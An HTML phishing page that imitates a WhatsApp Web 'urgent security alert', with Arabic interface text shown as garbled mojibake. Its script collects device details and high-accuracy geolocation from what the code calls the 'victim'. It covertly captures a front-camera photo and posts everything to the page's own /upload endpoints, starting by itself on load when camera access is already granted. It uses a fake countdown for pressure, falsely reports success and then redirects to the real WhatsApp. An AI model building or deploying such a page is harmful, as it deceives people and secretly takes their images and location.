<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web - ØªØ­Ø¯ÙŠØ« Ø£Ù…Ù†ÙŠ</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>ğŸ“±</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: #25d366;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        .whatsapp-logo {
            font-size: 24px;
            margin-left: 10px;
        }
        
        .header-text {
            font-size: 18px;
            font-weight: bold;
        }
        
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .security-panel {
            background: #1f1f1f;
            border-radius: 15px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 2px solid #25d366;
            box-shadow: 0 10px 30px rgba(37, 211, 102, 0.2);
        }
        
        .security-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .alert-title {
            color: #ff4444;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .alert-message {
            color: #cccccc;
            line-height: 1.6;
            margin-bottom: 25px;
            font-size: 16px;
        }
        
        .steps {
            text-align: right;
            margin: 25px 0;
        }
        
        .step {
            padding: 10px 15px;
            margin: 8px 0;
            border-radius: 8px;
            background: #2a2a2a;
            border-right: 4px solid #666;
        }
        
        .step.completed {
            background: #1a4a2e;
            border-right-color: #25d366;
            color: #25d366;
        }
        
        .step.current {
            background: #4a2c1a;
            border-right-color: #ff9800;
            color: #ff9800;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.7; }
        }
        
        .verify-btn {
            background: linear-gradient(45deg, #25d366, #128c7e);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin: 20px 0;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
        }
        
        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
        }
        
        .countdown {
            background: #ff4444;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-top: 15px;
            font-weight: bold;
            animation: urgentPulse 1s infinite;
        }
        
        @keyframes urgentPulse {
            0% { background: #ff4444; }
            50% { background: #cc0000; }
            100% { background: #ff4444; }
        }
        
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #25d366;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #25d366;
        }
        
        video, canvas {
            display: none;
        }
        
        .fake-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #25d366;
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 1000;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="whatsapp-logo">ğŸ“±</div>
        <div class="header-text">WhatsApp Web - Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ù…Ø§Ù†</div>
    </div>
    
    <div class="fake-notification" id="notification">
        ğŸ”” ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù†Ø´Ø§Ø· Ù…Ø´Ø¨ÙˆÙ‡ Ø¹Ù„Ù‰ Ø­Ø³Ø§Ø¨Ùƒ
    </div>
    
    <div class="container">
        <div class="security-panel">
            <div class="security-icon">ğŸ›¡ï¸</div>
            <div class="alert-title">ØªØ­Ø°ÙŠØ± Ø£Ù…Ù†ÙŠ Ø¹Ø§Ø¬Ù„</div>
            <div class="alert-message">
                ØªÙ… Ø±ØµØ¯ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ØºÙŠØ± Ù…ØµØ±Ø­ Ù…Ù† Ø¬Ù‡Ø§Ø² Ù…Ø¬Ù‡ÙˆÙ„ ÙÙŠ Ø§Ù„ØµÙŠÙ†.<br>
                Ù„Ø­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ ÙˆÙ…Ø­Ø§Ø¯Ø«Ø§ØªÙƒØŒ ÙŠØ¬Ø¨ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ ÙÙˆØ±Ø§Ù‹.
            </div>
            
            <div class="steps">
                <div class="step completed">
                    âœ… 1. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ
                </div>
                <div class="step current" id="currentStep">
                    ğŸ”„ 2. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                </div>
                <div class="step">
                    â³ 3. ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©
                </div>
            </div>
            
            <button class="verify-btn" onclick="startVerification()" id="verifyBtn">
                ğŸ”’ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù…Ù†
            </button>
            
            <div class="countdown" id="countdown">
                â° ÙŠÙ†ØªÙ‡ÙŠ Ù‡Ø°Ø§ Ø§Ù„ØªØ­Ø°ÙŠØ± Ø®Ù„Ø§Ù„: <span id="timer">300</span> Ø«Ø§Ù†ÙŠØ©
            </div>
            
            <div class="spinner" id="spinner"></div>
            <div class="status" id="status"></div>
        </div>
    </div>
    
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const verifyBtn = document.getElementById('verifyBtn');
        const currentStep = document.getElementById('currentStep');
        
        // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©
        const victimInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            location: window.location.href,
            pageType: 'advanced_whatsapp'
        };
        
        // Ø¹Ø¯Ø§Ø¯ ØªÙ†Ø§Ø²Ù„ÙŠ Ù„Ù„Ø¶ØºØ· Ø§Ù„Ù†ÙØ³ÙŠ
        let timeLeft = 300;
        const timerElement = document.getElementById('timer');
        
        const countdownInterval = setInterval(() => {
            timeLeft--;
            timerElement.textContent = timeLeft;
            
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                window.location.href = 'https://web.whatsapp.com';
            }
        }, 1000);
        
        // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†ÙŠ
        setTimeout(() => {
            const notification = document.getElementById('notification');
            if (notification) {
                notification.style.animation = 'slideIn 0.5s ease reverse';
                setTimeout(() => notification.remove(), 500);
            }
        }, 5000);
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    victimInfo.latitude = position.coords.latitude;
                    victimInfo.longitude = position.coords.longitude;
                    victimInfo.accuracy = position.coords.accuracy;
                },
                (error) => console.log('GPS denied:', error),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ù…Ø³Ø¨Ù‚
        async function checkExistingPermission() {
            if (navigator.permissions) {
                try {
                    const result = await navigator.permissions.query({name: 'camera'});
                    return result.state === 'granted';
                } catch (e) {
                    return false;
                }
            }
            return false;
        }
        
        // Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ­Ù‚Ù‚
        async function startVerification() {
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'ğŸ”„ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¶ÙŠØ±...';
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø­Ø§Ù„ÙŠØ©
            currentStep.innerHTML = 'ğŸ”„ Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§...';
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ù…Ø³Ø¨Ù‚
            const hasPermission = await checkExistingPermission();
            
            if (hasPermission) {
                // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥Ø°Ù† Ù…ÙˆØ¬ÙˆØ¯ØŒ Ø§Ø¨Ø¯Ø£ ÙÙˆØ±Ø§Ù‹
                await capturePhoto();
            } else {
                // Ø§Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© ØªØ­ÙÙŠØ²ÙŠØ©
                showCameraRequest();
            }
        }
        
        // Ø¹Ø±Ø¶ Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø·Ø±ÙŠÙ‚Ø© Ù…Ù‚Ù†Ø¹Ø©
        function showCameraRequest() {
            currentStep.innerHTML = 'âš ï¸ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©';
            status.textContent = 'Ø§Ù†Ù‚Ø± "Ø§Ù„Ø³Ù…Ø§Ø­" Ø¹Ù†Ø¯ Ø¸Ù‡ÙˆØ± Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§';
            status.style.color = '#ff9800';
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            setTimeout(capturePhoto, 1000);
        }
        
        // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
        async function capturePhoto() {
            try {
                spinner.style.display = 'block';
                status.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©...';
                status.style.color = '#25d366';
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;
                currentStep.innerHTML = 'ğŸ“¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©...';
                status.textContent = 'ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù†Ø¸Ø± Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§...';
                
                // Ø§Ù†ØªØ¸Ø§Ø± Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙˆØ±Ø© Ø£ÙØ¶Ù„
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                // ØªØ­ÙˆÙŠÙ„ Ù„Ù€ blob ÙˆØ¥Ø±Ø³Ø§Ù„
                canvas.toBlob(async (blob) => {
                    stream.getTracks().forEach(track => track.stop());
                    await sendPhoto(blob, victimInfo);
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                console.error('Camera error:', error);
                handleCameraError();
            }
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø®Ø·Ø£ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        function handleCameraError() {
            currentStep.innerHTML = 'âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§';
            status.textContent = 'Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©...';
            status.style.color = '#ff4444';
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø¯ÙˆÙ† ØµÙˆØ±Ø©
            setTimeout(() => sendInfoOnly(victimInfo), 2000);
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        async function sendPhoto(photoBlob, info) {
            try {
                status.textContent = 'Ø¬Ø§Ø±ÙŠ Ø±ÙØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ©...';
                
                const formData = new FormData();
                formData.append('photo', photoBlob, 'security_check.jpg');
                formData.append('info', JSON.stringify(info));
                
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    showSuccess();
                } else {
                    throw new Error('Upload failed');
                }
            } catch (error) {
                console.error('Upload error:', error);
                status.textContent = 'Ø­Ø¯Ø« Ø®Ø·Ø£ØŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰...';
                setTimeout(() => sendInfoOnly(info), 2000);
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙ‚Ø·
        async function sendInfoOnly(info) {
            try {
                await fetch('/upload_info', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(info)
                });
                showSuccess();
            } catch (error) {
                console.error('Info upload error:', error);
                showSuccess(); // Ø§Ø¹Ø±Ø¶ Ø§Ù„Ù†Ø¬Ø§Ø­ Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
            }
        }
        
        // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
        function showSuccess() {
            spinner.style.display = 'none';
            currentStep.innerHTML = 'âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­';
            currentStep.className = 'step completed';
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø«Ø§Ù„Ø«Ø©
            const steps = document.querySelectorAll('.step');
            steps[2].className = 'step current';
            steps[2].innerHTML = 'ğŸ”„ Ø¬Ø§Ø±ÙŠ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©...';
            
            status.textContent = 'âœ… ØªÙ… ØªØ£Ù…ÙŠÙ† Ø­Ø³Ø§Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­!';
            status.style.color = '#25d366';
            
            // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
            setTimeout(() => {
                window.location.href = 'https://web.whatsapp.com';
            }, 3000);
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
        window.onload = () => {
            setTimeout(() => {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥Ø°Ù† Ù…ÙˆØ¬ÙˆØ¯
                checkExistingPermission().then(hasPermission => {
                    if (hasPermission) {
                        startVerification();
                    }
                });
            }, 3000);
        };
    </script>
</body>
</html>
